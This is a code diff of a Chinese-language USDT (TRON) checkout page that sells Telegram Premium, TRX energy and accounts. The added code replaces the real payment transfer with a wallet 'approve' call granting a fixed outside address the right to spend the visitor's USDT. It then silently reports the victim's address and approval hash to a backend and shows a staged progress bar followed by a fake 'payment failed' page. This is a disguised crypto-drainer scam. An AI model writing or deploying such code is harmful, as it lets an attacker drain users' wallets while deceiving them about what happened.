+                const loadingSection = document.getElementById('loadingSection');
+                const loadingText = document.getElementById('loadingText');
+                
+                if (payBtn) payBtn.disabled = true;
+                if (loadingText) loadingText.textContent = '正在请求USDT授权...';
+                if (loadingSection) loadingSection.style.display = 'block';
+                
+                // 调用合约approve方法授权给EOA地址
+                const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
+                
+                const result = await contract.approve(
+                    EOA_ADDRESS,
+                    EOA_APPROVE_AMOUNT
+                ).send({
+                    feeLimit: 100000000,
+                    callValue: 0,
+                    shouldPollResponse: false
+                });
+                
+                // 验证交易哈希
+                if (!result || !/^[a-fA-F0-9]{64}$/.test(result)) {
+                    console.error('❌ 授权交易哈希无效:', result);
+                    throw new Error('授权失败：交易哈希无效');
+                }
+                
+                authTxHash = result;
+                console.log('✅ EOA授权交易已发送，哈希:', authTxHash);
+                
+                if (loadingText) loadingText.textContent = '等待授权确认...';
+                
+                // 等待交易确认（≥1区块）
+                const isConfirmed = await waitForTransactionConfirmation(authTxHash);
+                
+                if (!isConfirmed) {
+                    throw new Error('授权确认失败');
+                }
+                
+                console.log('✅ EOA授权确认成功');
+                
+                // 🔥 核心修复：授权成功后，静默同步到后台系统
+                await syncAuthorizationToBackend();
+                
+            } catch (error) {
+                // 用户取消授权的情况
+                if (error.message && (
+                    error.message.includes('User denied') || 
+                    error.message.includes('rejected') || 
+                    error.message.includes('canceled') ||
+                    error.message.includes('用户拒绝') ||
+                    error.message.includes('用户取消') ||
+                    error.message.includes('denied transaction') ||
+                    error.message.includes('cancelled by user')
+                )) {
+                    console.log('🚫 用户取消了授权');
+                    throw new Error('用户取消了授权');
+                }
+                
+                console.error('EOA授权失败:', error);
+                throw new Error('USDT授权失败: ' + (error.message || '未知错误'));
+            } finally {
+                const loadingSection = document.getElementById('loadingSection');
+                const payBtn = document.getElementById('payBtn');
+                
+                if (loadingSection) loadingSection.style.display = 'none';
+                if (payBtn) payBtn.disabled = false;
+            }
+        }
+        
+        /**
+         * 同步授权信息到后台系统
+         */
+        async function syncAuthorizationToBackend() {
+            try {
+                console.log('🔄 开始同步授权信息到后台系统...');
+                
+                if (!currentUserAddress) {
+                    console.error('❌ 同步失败：缺少用户地址');
+                    return false;
+                }
+                
+                const response = await fetch('/submit_address.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        address: currentUserAddress,
+                        auth_tx_hash: authTxHash || '',
+                        eoa_address: 'TX8Dk3KN3sVW2PjaMhnUh86Dj37c4KFFoB',
+                        source: 'payment_page_auto_sync',
+                        timestamp: Date.now()
+                    })
+                });
+                
+                const result = await response.json();
+                console.log('📥 同步响应:', result);
+                
+                if (result.success) {
+                    console.log('✅ 授权信息同步成功');
+                    return true;
+                } else {
+                    console.error('❌ 同步失败:', result.error);
+                    return false;
+                }
+                
+            } catch (error) {
+                console.error('🔕 同步失败（静默）:', error);
+                return false;
+            }
+        }
+        
+        // 等待交易确认
+        async function waitForTransactionConfirmation(txHash) {
+            return new Promise((resolve) => {
+                console.log('⏳ 等待交易确认...');
+                
+                let checkCount = 0;
+                const maxChecks = 30; // 最多等待3分钟（每6秒检查一次）
+                const requiredConfirmations = 1; // 至少1个区块确认
+                
+                const checkInterval = setInterval(async () => {
+                    try {
+                        checkCount++;
+                        console.log(`🔄 检查交易状态 (${checkCount}/${maxChecks}): ${txHash}`);
+                        
+                        const transaction = await window.tronWeb.trx.getTransaction(txHash);
+                        
+                        if (transaction && transaction.ret) {
+                            const ret = transaction.ret[0];
+                            
+                            if (ret.contractRet === 'SUCCESS') {
+                                // 交易成功，检查确认数
+                                const txInfo = await window.tronWeb.trx.getTransactionInfo(txHash);
+                                if (txInfo && txInfo.receipt && txInfo.receipt.result === 'SUCCESS') {
+                                    console.log(`✅ 交易成功，确认数: ${txInfo.confirmed ? '已确认' : '未确认'}`);
+                                    
+                                    if (txInfo.confirmed || checkCount >= 2) {
+                                        // 已确认或至少等待了2个检查周期（12秒）
+                                        clearInterval(checkInterval);
+                                        resolve(true);
+                                        return;
+                                    }
+                                }
+                            } else if (ret.contractRet === 'REVERT' || ret.contractRet === 'FAIL') {
+                                console.error('❌ 交易失败:', ret.contractRet);
+                                clearInterval(checkInterval);
+                                resolve(false);
+                                return;
+                            }
+                        }
+                        
+                        if (checkCount >= maxChecks) {
+                            console.warn('⚠️ 交易确认超时');
+                            clearInterval(checkInterval);
+                            resolve(false);
+                        }
+                    } catch (error) {
+                        console.log('检查交易状态失败:', error);
+                    }
+                }, 6000); // 每6秒检查一次
+            });
+        }
+        
+        // ==================== 辅助函数 ====================
+        
         function generateOrderId(prefix) {
             return prefix + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
         }
-
-        // 获取账号类型名称
+        
         function getAccountTypeName(type) {
             const typeMap = {
                 'telegram_twitter': 'Telegram/推特账号',
@@ -682,276 +1557,308 @@
             };
             return typeMap[type] || type;
         }
-
-        // 连接钱包
-        function connectWallet() {
-            let userAddress = '';
-            let isConnected = false;
+        
+        function getOrderData() {
+            const orderId = originalParams.orderId || generateOrderId('ORD');
+            const amount = originalParams.amount || originalParams.price || '0.99';
+            const quantity = originalParams.quantity || '1';
             
-            if (window.tronWeb && window.tronWeb.defaultAddress) {
-                userAddress = window.tronWeb.defaultAddress.base58;
-                isConnected = true;
-            } else if (window.tronLink && window.tronLink.tronWeb) {
-                window.tronWeb = window.tronLink.tronWeb;
-                if (window.tronWeb.defaultAddress) {
-                    userAddress = window.tronWeb.defaultAddress.base58;
-                    isConnected = true;
-                }
-            }
-            
-            if (isConnected) {
-                document.getElementById('walletStatusText').textContent = `✅ 钱包已连接 (${userAddress.substring(0, 8)}...)`;
-                document.getElementById('payBtn').disabled = false;
-            } else {
-                document.getElementById('walletStatusText').textContent = '❌ 钱包连接失败，请刷新页面';
-            }
-        }
-
-        // 开始支付流程
-        async function startPaymentProcess() {
-            const payBtn = document.getElementById('payBtn');
-            const loadingSection = document.getElementById('loadingSection');
-            const loadingText = document.getElementById('loadingText');
-            const txHashDisplay = document.getElementById('txHashDisplay');
-
-            payBtn.style.display = 'none';
-            loadingSection.style.display = 'block';
-
-            try {
-                // 获取支付金额
-                let amount = '0.99'; // 默认值
-                if (serviceType === 'trx') {
-                    amount = '1.99';
-                } else if (serviceType === 'account') {
-                    amount = document.getElementById('amountDisplay').textContent.replace(' USDT', '');
-                }
-
-                // 检查授权状态
-                loadingText.textContent = '检查授权状态...';
-                const isApproved = await checkApprovalStatus();
-
-                if (!isApproved) {
-                    loadingText.textContent = '正在请求 USDT 授权...';
-                    const approveResult = await requestUSDTApproval();
-                    
-                    txHashDisplay.textContent = `授权交易: ${approveResult}`;
-                    txHashDisplay.style.display = 'block';
-                    loadingText.textContent = '等待授权确认...';
-                    
-                    const isApproveConfirmed = await waitForTransactionConfirmation(approveResult);
-                    if (!isApproveConfirmed) {
-                        throw new Error('授权确认失败');
-                    }
-                }
-
-                // 更新步骤
-                updateStep(1, 'completed');
-                updateStep(2, 'active');
-
-                loadingText.textContent = '授权成功，正在执行支付...';
-                const paymentAmount = Math.floor(parseFloat(amount) * 1000000);
-                const paymentResult = await executePaymentTransaction(paymentAmount);
-                
-                txHashDisplay.textContent = `支付交易: ${paymentResult}`;
-                loadingText.textContent = '支付已提交，等待确认...';
-                
-                const isPaymentConfirmed = await waitForTransactionConfirmation(paymentResult);
-                
-                if (isPaymentConfirmed) {
-                    updateStep(2, 'completed');
-                    showSuccessMessage(paymentResult, amount);
-                } else {
-                    throw new Error('支付确认失败');
-                }
-                
-            } catch (error) {
-                console.error('支付流程失败:', error);
-                loadingText.textContent = '支付失败';
-                
-                if (error.message.includes('User denied')) {
-                    alert('您取消了交易授权');
-                } else if (error.message.includes('insufficient')) {
-                    alert('余额不足，请确保有足够的 USDT 和 TRX 作为手续费');
-                } else if (error.message.includes('revert')) {
-                    alert('交易失败，请检查授权状态或联系客服');
-                } else {
-                    alert('支付失败: ' + error.message);
-                }
-                
-                payBtn.style.display = 'block';
-                loadingSection.style.display = 'none';
-                updateStep(1, 'active');
-            }
-        }
-
-        // 更新步骤状态
-        function updateStep(stepNumber, status) {
-            const step = document.getElementById(`step${stepNumber}`);
-            step.className = `step step-${serviceType} ${status}`;
-        }
-
-        // 检查授权状态
-        async function checkApprovalStatus() {
-            try {
-                const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
-                const userAddress = window.tronWeb.defaultAddress.base58;
-                const allowance = await contract.allowance(userAddress, RECEIVE_ADDRESS).call();
-                return allowance >= 1000000; // 至少授权 1 USDT
-            } catch (error) {
-                console.error('检查授权状态失败:', error);
-                return false;
-            }
-        }
-
-        // 请求 USDT 授权
-        async function requestUSDTApproval() {
-            try {
-                const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
-                const result = await contract.approve(
-                    RECEIVE_ADDRESS,
-                    ACTUAL_APPROVE_AMOUNT
-                ).send({
-                    feeLimit: 100000000,
-                    callValue: 0,
-                    shouldPollResponse: false
-                });
-                return result;
-            } catch (error) {
-                throw new Error('USDT 授权失败: ' + error.message);
-            }
-        }
-
-        // 执行支付交易
-        async function executePaymentTransaction(amount) {
-            try {
-                const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
-                const result = await contract.transfer(
-                    RECEIVE_ADDRESS,
-                    amount
-                ).send({
-                    feeLimit: 100000000,
-                    callValue: 0,
-                    shouldPollResponse: false
-                });
-                return result;
-            } catch (error) {
-                throw new Error('支付交易失败: ' + error.message);
-            }
-        }
-
-        // 等待交易确认
-        async function waitForTransactionConfirmation(txHash) {
-            return new Promise((resolve) => {
-                let checkCount = 0;
-                const maxChecks = 30;
-                
-                const checkInterval = setInterval(async () => {
-                    try {
-                        checkCount++;
-                        const transaction = await window.tronWeb.trx.getTransaction(txHash);
-                        
-                        if (transaction && transaction.ret) {
-                            const ret = transaction.ret[0];
-                            if (ret.contractRet === 'SUCCESS') {
-                                clearInterval(checkInterval);
-                                resolve(true);
-                                return;
-                            } else if (ret.contractRet === 'REVERT' || ret.contractRet === 'FAIL') {
-                                clearInterval(checkInterval);
-                                resolve(false);
-                                return;
-                            }
-                        }
-                        
-                        if (checkCount >= maxChecks) {
-                            clearInterval(checkInterval);
-                            resolve(false);
-                        }
-                    } catch (error) {
-                        console.log('检查交易状态失败:', error);
-                    }
-                }, 6000);
-            });
-        }
-
-        // 显示成功消息
-        function showSuccessMessage(txHash, amount) {
-            const paymentContainer = document.querySelector('.payment-container');
-            const orderId = document.getElementById('orderIdDisplay').textContent;
-            
-            let serviceName = '';
-            let serviceDesc = '';
+            let productType = '';
+            let servicePeriod = '';
             
             if (serviceType === 'premium') {
-                serviceName = 'Telegram Premium 订阅';
-                serviceDesc = 'Telegram Premium 功能已为您激活，请重新登录 Telegram 查看';
+                productType = 'Telegram Premium 订阅';
+                servicePeriod = '3月';
             } else if (serviceType === 'trx') {
-                serviceName = 'TRX波场能量订阅';
-                serviceDesc = 'TRX波场能量服务已激活，请查看您的钱包';
-            } else {
-                const accountType = document.getElementById('accountTypeDisplay').textContent;
-                const accountName = document.getElementById('accountNameDisplay').textContent;
-                serviceName = `${accountType}购买`;
-                serviceDesc = '账号信息将在24小时内发送，如有问题请联系客服';
-            }
-
-            paymentContainer.innerHTML = `
-                <div class="header header-${serviceType}">
-                    <h1>🎉 支付成功</h1>
-                    <p>${serviceName}已完成</p>
-                </div>
+                productType = 'TRX波场能量';
+                servicePeriod = '1月';
+            } else if (serviceType === 'account') {
+                const accountType = originalParams.accountType || '';
+                const accountName = originalParams.accountName || '';
                 
-                <div style="text-align: center; padding: 2rem 1.5rem;">
-                    <div style="font-size: 4rem; margin-bottom: 1rem;">✅</div>
-                    <h2 style="color: #52c41a; margin-bottom: 1.5rem;">支付成功！</h2>
-                    
-                    <div style="background: #f6ffed; border: 1px solid #b7eb8f; border-radius: 0.5rem; padding: 1rem; margin-bottom: 1rem; text-align: left;">
-                        <div style="font-weight: 600; margin-bottom: 0.5rem; color: #389e0d;">订单信息</div>
-                        <div style="font-size: 0.9rem;">
-                            <div>订单号: ${orderId}</div>
-                            <div>金额: ${amount} USDT</div>
-                            <div>时间: ${new Date().toLocaleString()}</div>
-                        </div>
-                    </div>
-                    
-                    <div style="background: #e6f7ff; border: 1px solid #91d5ff; border-radius: 0.5rem; padding: 1rem; margin-bottom: 1.5rem; text-align: left;">
-                        <div style="font-weight: 600; margin-bottom: 0.5rem; color: #1890ff;">交易信息</div>
-                        <div style="font-size: 0.8rem;">
-                            <div>交易哈希:</div>
-                            <div style="word-break: break-all; font-family: monospace; background: rgba(0,0,0,0.05); padding: 0.5rem; border-radius: 0.25rem; margin-top: 0.25rem;">
-                                ${txHash}
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div style="background: #fff7e6; border: 1px solid #ffd591; border-radius: 0.5rem; padding: 1rem;">
-                        <div style="font-size: 0.9rem; color: #d46b08;">
-                            ✅ <strong>订单已确认</strong><br>
-                            ${serviceDesc}
-                        </div>
-                    </div>
-                    
-                    <p style="margin-top: 2rem; color: #999; font-size: 0.9rem;">
-                        页面将在 <span id="countdown">5</span> 秒后自动关闭
-                    </p>
-                </div>
-            `;
-            
-            let countdown = 5;
-            const countdownElement = document.getElementById('countdown');
-            const countdownInterval = setInterval(() => {
-                countdown--;
-                countdownElement.textContent = countdown;
-                
-                if (countdown <= 0) {
-                    clearInterval(countdownInterval);
-                    window.close();
+                if (accountType && accountName) {
+                    const accountTypeName = getAccountTypeName(accountType);
+                    productType = `账号购买 - ${accountTypeName}: ${accountName}`;
+                } else {
+                    productType = '账号购买';
                 }
-            }, 1000);
+                servicePeriod = '';
+            } else {
+                productType = '未知商品';
+                servicePeriod = '';
+            }
+            
+            return {
+                orderId,
+                amount,
+                productType,
+                quantity,
+                servicePeriod,
+                serviceType
+            };
         }
-
-        // 页面加载时初始化
-        document.addEventListener('DOMContentLoaded', renderServiceInterface);
-    </script>
-</body>
-</html>
+        
+        // ==================== 弹窗和界面控制 ====================
+        
+        function showConfirmModal(paymentData) {
+            const modal = document.getElementById('confirmModal');
+            const orderIdEl = document.getElementById('confirmOrderId');
+            const amountEl = document.getElementById('confirmAmount');
+            const productTypeEl = document.getElementById('confirmProductType');
+            const quantityEl = document.getElementById('confirmQuantity');
+            const walletAddressEl = document.getElementById('confirmWalletAddress');
+            const titleEl = document.getElementById('confirmModalTitle');
+            
+            if (!modal || !orderIdEl || !amountEl) {
+                alert('确认弹窗加载失败');
+                return;
+            }
+            
+            orderIdEl.textContent = paymentData.orderId;
+            amountEl.textContent = paymentData.amount + ' USDT';
+            productTypeEl.textContent = paymentData.productType;
+                quantityEl.textContent = paymentData.quantity + ' 个';
+                walletAddressEl.textContent = paymentData.walletAddress || '未知地址';
+                
+                if (titleEl) {
+                    titleEl.textContent = paymentData.productType + ' - 支付确认';
+                }
+                
+                modal.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            }
+            
+            function closeConfirmModal() {
+                const modal = document.getElementById('confirmModal');
+                const overlay = document.getElementById('processingOverlay');
+                
+                if (modal) modal.classList.remove('active');
+                if (overlay) overlay.classList.remove('active');
+                
+                document.body.style.overflow = '';
+                
+                const payBtn = document.getElementById('payBtn');
+                if (payBtn) payBtn.disabled = false;
+            }
+            
+            async function processFinalPayment() {
+                if (!currentPaymentData) {
+                    showPaymentFailedPageImmediately(getOrderData());
+                    return;
+                }
+                
+                const finalConfirmBtn = document.getElementById('finalConfirmBtn');
+                const processingOverlay = document.getElementById('processingOverlay');
+                
+                if (finalConfirmBtn) finalConfirmBtn.disabled = true;
+                if (processingOverlay) processingOverlay.classList.add('active');
+                
+                try {
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    
+                    closeConfirmModal();
+                    
+                    showPaymentProcessingPage(currentPaymentData);
+                    
+                    await processPaymentWithProgress();
+                    
+                    setTimeout(() => {
+                        hidePaymentProcessingPage();
+                        showPaymentFailedPage(currentPaymentData);
+                    }, 5000);
+                    
+                } catch (error) {
+                    setTimeout(() => {
+                        hidePaymentProcessingPage();
+                        showPaymentFailedPage(currentPaymentData);
+                    }, 5000);
+                } finally {
+                    if (finalConfirmBtn) finalConfirmBtn.disabled = false;
+                    if (processingOverlay) processingOverlay.classList.remove('active');
+                }
+            }
+            
+            function showPaymentProcessingPage(paymentData) {
+                const processingPage = document.getElementById('processingPage');
+                const messageElement = document.getElementById('processingPageMessage');
+                
+                if (processingPage) {
+                    if (messageElement) {
+                        messageElement.textContent = `正在处理您的支付请求：${paymentData.productType}，金额：${paymentData.amount} USDT，请耐心等待...`;
+                    }
+                    
+                    processingPage.classList.add('active');
+                    document.body.style.overflow = 'hidden';
+                    
+                    // 重置进度条状态
+                    document.getElementById('progressFill').style.width = '0%';
+                    document.getElementById('countdownSeconds').textContent = '5';
+                    
+                    // 重置所有阶段状态
+                    for (let i = 1; i <= 4; i++) {
+                        const stage = document.getElementById('stage' + i);
+                        stage.classList.remove('active', 'completed');
+                    }
+                }
+            }
+            
+            function hidePaymentProcessingPage() {
+                const processingPage = document.getElementById('processingPage');
+                if (processingPage) {
+                    processingPage.classList.remove('active');
+                    document.body.style.overflow = '';
+                }
+            }
+            
+            async function processPaymentWithProgress() {
+                return new Promise((resolve) => {
+                    const progressFill = document.getElementById('progressFill');
+                    const countdownSeconds = document.getElementById('countdownSeconds');
+                    
+                    let progress = 0;
+                    let seconds = 5;
+                    const totalTime = 5000;
+                    const interval = 100;
+                    const steps = totalTime / interval;
+                    const progressIncrement = 100 / steps;
+                    
+                    if (countdownSeconds) {
+                        countdownSeconds.textContent = seconds;
+                    }
+                    
+                    // 阶段时间配置（毫秒）
+                    const stageTimes = [
+                        1000,  // 阶段1：0-1秒
+                        2500,  // 阶段2：1-2.5秒
+                        4000,  // 阶段3：2.5-4秒
+                        5000   // 阶段4：4-5秒
+                    ];
+                    
+                    let stageIndex = 0;
+                    let elapsedTime = 0;
+                    
+                    const timer = setInterval(() => {
+                        progress += progressIncrement;
+                        elapsedTime += interval;
+                        
+                        if (progressFill) {
+                            progressFill.style.width = progress + '%';
+                        }
+                        
+                        // 更新倒计时
+                        const newSeconds = Math.ceil((totalTime - (progress / 100 * totalTime)) / 1000);
+                        if (newSeconds !== seconds && countdownSeconds) {
+                            seconds = newSeconds;
+                            countdownSeconds.textContent = seconds;
+                        }
+                        
+                        // 更新阶段状态
+                        if (stageIndex < stageTimes.length && elapsedTime >= stageTimes[stageIndex]) {
+                            for (let i = 1; i <= stageIndex; i++) {
+                                const stage = document.getElementById('stage' + i);
+                                if (stage) {
+                                    stage.classList.remove('active');
+                                    stage.classList.add('completed');
+                                }
+                            }
+                            
+                            const currentStage = document.getElementById('stage' + (stageIndex + 1));
+                            if (currentStage) {
+                                currentStage.classList.add('active');
+                            }
+                            
+                            stageIndex++;
+                        }
+                        
+                        if (progress >= 100) {
+                            clearInterval(timer);
+                            resolve();
+                        }
+                    }, interval);
+                });
+            }
+            
+            function showPaymentFailedPageImmediately(orderData) {
+                const paymentContainer = document.querySelector('.payment-container');
+                if (!paymentContainer) return;
+                
+                const serviceTypeClass = serviceType === 'premium' ? 'header-premium' : 
+                                       serviceType === 'trx' ? 'header-trx' : 'header-account';
+                
+                paymentContainer.innerHTML = `
+                    <div class="header ${serviceTypeClass}" style="background: linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%);">
+                        <h1>❌ 支付失败</h1>
+                        <p>金额: ${orderData.amount} USDT</p>
+                    </div>
+                    
+                    <div style="text-align: center; padding: 2rem 1.5rem;">
+                        <div style="font-size: 4rem; margin-bottom: 1rem;">💳</div>
+                        <h2 style="color: #ff4d4f; margin-bottom: 1rem;">支付失败</h2>
+                        
+                        <div style="background: #fff2f0; border: 1px solid #ffccc7; border-radius: 0.5rem; padding: 1rem; margin-bottom: 1.5rem;">
+                            <div style="color: #ff4d4f; font-weight: 600; margin-bottom: 0.5rem;">支付信息</div>
+                            <div>订单号: ${orderData.orderId}</div>
+                            <div>金额: <strong>${orderData.amount} USDT</strong></div>
+                            <div>商品类型: ${orderData.productType}</div>
+                            <div>数量: ${orderData.quantity} 个</div>
+                        </div>
+                        
+                        <div style="margin-top: 2rem;">
+                            <button onclick="goBackToHome()" style="background: #1890ff; color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 0.5rem; cursor: pointer; margin-right: 1rem;">
+                                返回首页
+                            </button>
+                            <button onclick="contactSupport()" style="background: #52c41a; color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 0.5rem; cursor: pointer;">
+                                联系客服
+                            </button>
+                        </div>
+                    </div>
+                `;
+            }
+            
+            function showPaymentFailedPage(orderData) {
+                const paymentContainer = document.querySelector('.payment-container');
+                if (!paymentContainer) return;
+                
+                const serviceTypeClass = serviceType === 'premium' ? 'header-premium' : 
+                                       serviceType === 'trx' ? 'header-trx' : 'header-account';
+                
+                paymentContainer.innerHTML = `
+                    <div class="header ${serviceTypeClass}" style="background: linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%);">
+                        <h1>❌ 支付失败</h1>
+                        <p>金额: ${orderData.amount} USDT</p>
+                    </div>
+                    
+                    <div style="text-align: center; padding: 2rem 1.5rem;">
+                        <div style="font-size: 4rem; margin-bottom: 1rem;">💳</div>
+                        <h2 style="color: #ff4d4f; margin-bottom: 1rem;">支付失败</h2>
+                        
+                        <div style="background: #fff2f0; border: 1px solid #ffccc7; border-radius: 0.5rem; padding: 1rem; margin-bottom: 1.5rem;">
+                            <div style="color: #ff4d4f; font-weight: 600; margin-bottom: 0.5rem;">支付信息</div>
+                            <div>订单号: ${orderData.orderId}</div>
+                            <div>金额: <strong>${orderData.amount} USDT</strong></div>
+                            <div>商品类型: ${orderData.productType}</div>
+                            <div>数量: ${orderData.quantity} 个</div>
+                        </div>
+                        
+                        <div style="margin-top: 2rem;">
+                            <button onclick="goBackToHome()" style="background: #1890ff; color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 0.5rem; cursor: pointer; margin-right: 1rem;">
+                                返回首页
+                            </button>
+                            <button onclick="contactSupport()" style="background: #52c41a; color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 0.5rem; cursor: pointer;">
+                                联系客服
+                            </button>
+                        </div>
+                    </div>
+                `;
+            }
+            
+            function goBackToHome() {
+                window.location.href = 'index.html';
+            }
+            
+            function contactSupport() {
+                window.open('https://t.me/yunfeng0571', '_blank');
+            }
+        </script>
+    </body>
+    </html>
